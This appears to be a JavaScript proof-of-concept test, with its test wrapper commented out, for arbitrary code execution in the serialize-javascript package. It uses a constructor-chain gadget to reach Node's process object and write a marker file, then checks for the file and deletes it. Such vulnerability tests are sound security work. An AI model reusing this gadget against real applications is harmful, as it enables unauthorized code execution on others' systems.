// test("Arbitrary code execution in serialize-javascript", () => {
//   expect.assertions(2);
  const fs = require("fs");
  const serialize = require("serialize-javascript");
  const path = "./serialize-javascript";
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  eval(
    "(" +
      serialize({
        str:
          "string" +
          this.constructor
            .constructor(`return process`)()
            .mainModule.require(`fs`)
            .writeFileSync(`serialize-javascript`, ``),
      }) +
      ")"
  );
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
  fs.unlink(path, function (err) {});
// });
